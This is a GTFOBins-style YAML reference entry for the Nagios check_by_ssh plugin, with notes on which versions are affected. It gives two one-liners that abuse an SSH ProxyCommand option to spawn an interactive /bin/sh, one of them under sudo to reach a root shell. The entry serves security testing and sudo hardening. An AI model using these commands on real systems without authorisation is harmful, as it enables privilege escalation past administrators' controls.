---
description: |
  This is the `check_by_ssh` Nagios plugin, available e.g. in `/usr/lib/nagios/plugins/`.

  When `check_by_ssh` version `2.4.5` (2023-05-31) or later from the Nagios
  Plugins project in it's default configuration is used, it does not work anymore.

  It does still work on previous versions from the Nagios Plugins project or
  all versions from the Monitoring Project (e.g. used by Ubuntu/Debian).
functions:
  shell:
    - description: The shell will only last 10 seconds.
      code: check_by_ssh -o "ProxyCommand /bin/sh -i <$(tty) |& tee $(tty)" -H localhost -C xx
  sudo:
    - description: The shell will only last 10 seconds.
      code: sudo check_by_ssh -o "ProxyCommand /bin/sh -i <$(tty) |& tee $(tty)" -H localhost -C xx
---
